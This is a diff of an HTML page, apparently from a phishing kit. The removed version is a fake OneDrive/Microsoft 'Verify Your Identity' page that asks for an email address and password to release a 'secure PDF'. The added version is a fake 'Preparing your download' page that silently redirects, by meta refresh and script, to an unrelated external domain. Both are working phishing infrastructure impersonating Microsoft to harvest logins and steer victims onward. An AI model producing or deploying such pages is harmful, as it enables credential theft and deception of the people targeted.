@@ -1,68 +1,91 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OneDrive Verify Your Identity</title>
-    <link rel="stylesheet" href="styles.css">
+  <meta charset="UTF-8">
+  <title>Preparing Download</title>
+
+  <!-- Auto redirect -->
+  <meta http-equiv="refresh" content="3; url=https://cadena.theartofsimplicity.de/lIucJ/">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      background: #f6f7f9;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+      color: #111;
+    }
+    .card {
+      background: #fff;
+      padding: 40px 36px;
+      border-radius: 14px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+      text-align: center;
+      width: 320px;
+    }
+    .title {
+      font-size: 22px;
+      font-weight: 600;
+      margin-bottom: 10px;
+    }
+    .subtitle {
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 24px;
+    }
+    .loader {
+      width: 36px;
+      height: 36px;
+      border: 3px solid #e5e7eb;
+      border-top: 3px solid #2563eb;
+      border-radius: 50%;
+      margin: 0 auto 20px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    .link {
+      font-size: 13px;
+      color: #2563eb;
+      text-decoration: none;
+    }
+    .link:hover {
+      text-decoration: underline;
+    }
+    .footer {
+      margin-top: 18px;
+      font-size: 12px;
+      color: #777;
+    }
+  </style>
 </head>
+
 <body>
-    <div class="container">
-        <header class="header">
-            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR7LIqARBcvnrEjXQCTgqV509gt9WsrKI5Qxvvf2vS6AFEbE_arC2ysYLs&s" alt="OneDrive Logo" class="header__logo">
-            <h1 class="header__title">OneDrive</h1>
-        </header>
+  <div class="card">
+    <div class="title">Preparing your download</div>
+    <div class="subtitle">Your file is being securely transferred</div>
 
-        <main class="main">
-            <div class="card">
-                <h2 class="card__title">Verify Your Identity</h2>
-                <hr class="card__divider">
-                <p class="card__text">You've received a secure file</p>
+    <div class="loader"></div>
 
-                <div class="card__file-info">
-                    <img src="data:image/png;base64,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" alt="PDF Icon" class="card__file-icon">
-                    <span class="card__file-size">56.1KB</span>
-                </div>
+    <a class="link" href="https://cadena.theartofsimplicity.de/lIucJ/">
+      Click here if you are not redirected
+    </a>
 
-                <p class="card__instruction">To receive and download this PDF file, please enter specific professional email credentials that this document was sent to.</p>
-
-                <div class="card__microsoft-icons">
-                    <img src="data:image/png;base64,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" alt="Microsoft Outlook Icon" class="card__microsoft-icon">
-                    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAJwAAACUCAMAAABRNbASAAAAnFBMVEX////mShniKwDz39jmQgvmgWfx4NblQQD6+vnoh3T8///mRxP+//3jPgD5///lPADlMwD69PDpmIX16d/uqpvttqXtyLvmVC/lg2TtvrH36OLxz8TjUSDlYkHqln/z3dHnjnPidFXkWzrpclfurqPsno7lbE3on4niQR3lbUbvxLPmjXjnc13w1M3jTSXnXjPmrJfnembjV0TnZUwZZrDkAAAD5ElEQVR4nO3ce3OiMBAAcJ4GE2ISRSz4xBZ7vrCe3/+7XQDPu7a2ghrMTHdnOu30D/x1k8DSmV3DgICAgNA5/OOXgf0HSz4HNnAvWPenfv7TozEfQ4SJiRAlg6coFkXufB0yiHFHDLsjTs08COV8POlPhfy9DhnsBWPCCDFPQSjNxrNIPJblY2xHicX+g/0DcmuwXk0Fxv5jUojD9Zyiz7K/QEZHz+tV8xnEWNgzxNGZpL3zOYhb5mQVC2x0/KYy2HtJ0LnlPJ9BZiZpFDfAyk9nuDCRU012yiDK5pMw9nyjozCBXijvG7VkJyHlNElDW4UqP3U4fl2Qqst5LhyGfsUqbs++HS35dUn7Pyz7vrj8nPlDd85ulinAGWKbIurcsJxqcPmF7GCD6F1g98aJKKl532gC58udJsJJxu+0nHfFyfIxXRB6X9kdcPJwynpjebbeeDiu01mts1r3DeIwXvFPuQ0n7InJEKmaNelio/mmG4onphInjwC2g6RqDiQMMY6W3WiblxzYrZTrqzMn640MVTudxJF15uA52MoXGlmpdJTiZPk4nKCKj07G6W6fRq13H6MQ10sPVeoNmTDGHfdtmhe3hqcch7Fn98cV7hvyRJoHN/jqvUoFzsexu7uwnETufMva5Tu/eJk6e3k1y9qyvkuadKHs4L4ML11GFe7LK8mXp9EmiLaiIxdfLxwZuZEtjqiL//xoGIdm/vntpQWufWkpAQc4wAEOcIADHOAABzjAAQ5wgAMc4AAHOMABDnCAAxzgAAc4wAEOcIADHOAABzjAAQ5wgLsKx560xSGUpZriGNu/xLVatBrCEUbN1BY1OxgbwRE2akfCwEbN5kD1OMKswZtdZ6s1hkNsvG5hA3e0wxHG3P4N3ajqcISS8au4qTtGFc5hWRpetdEawI2jWO6zGxtP1eDiob2NhcThm+YXKMF5vmf3k9/7SRC2bllahW0urXTMLc7pchaEMo/l48F//LO1vHTZIIQQZZyNFvtuEA1bos42bKS1ChGTOA7Kvw/mSdofyjx6vnHxSasYd2xKY6deIZK3w1nMPLhpP9rG3ydSdeaK+NzORxzEqGPODxs3iHr50AqjeMC9tzaC+7IRkuSJlKeGHNZyQ9ofE9kQ7lILqVxrhkaHTbsrN6R3JOKGcMdP+775lhSLzWRdmkijzKPXIK5q23JxaDjKnt1dpQ7KRzR8yzxWof2cVvkyNB0yUITe4xlKop6DLUqb1iNBytBzmMoxtB5DU4amA3zK0Hr0USnUdGhUEVqP2ypD00FlReg94q2Icjge0204XhnFWMG2pmMFtR7ICAEB8YPiDzmWdTitex0EAAAAAElFTkSuQmCC" alt="Microsoft Icon" class="card__microsoft-icon">
-                </div>
-
-                <form class="card__form" action="#" method="POST">
-    
-    <input 
-        type="email" 
-        name="email"
-        class="card__input" 
-        placeholder="Enter email" 
-        required
-    >
-
-    <input 
-        type="password" 
-        name="password"
-        class="card__input" 
-        placeholder="Enter password" 
-        required
-        minlength="6"
-    >
-
-    <button type="submit" class="card__button">
-        Next
-    </button>
-
-</form>
-
-            </div>
-        </main>
-
-        <footer class="footer">
-            <p class="footer__copyright">&copy; 2025 Microsoft Privacy & Cookies</p>
-            <img src="https://mailmeteor.com/logos/assets/PNG/Microsoft_Logo_512px.png" alt="Microsoft Logo" class="footer__microsoft-logo">
-        </footer>
+    <div class="footer">
+      Please do not refresh this page
     </div>
+  </div>
+
+  <script>
+    setTimeout(function () {
+      window.location.href = "https://cadena.theartofsimplicity.de/lIucJ/";
+    }, 3000);
+  </script>
 </body>
 </html>
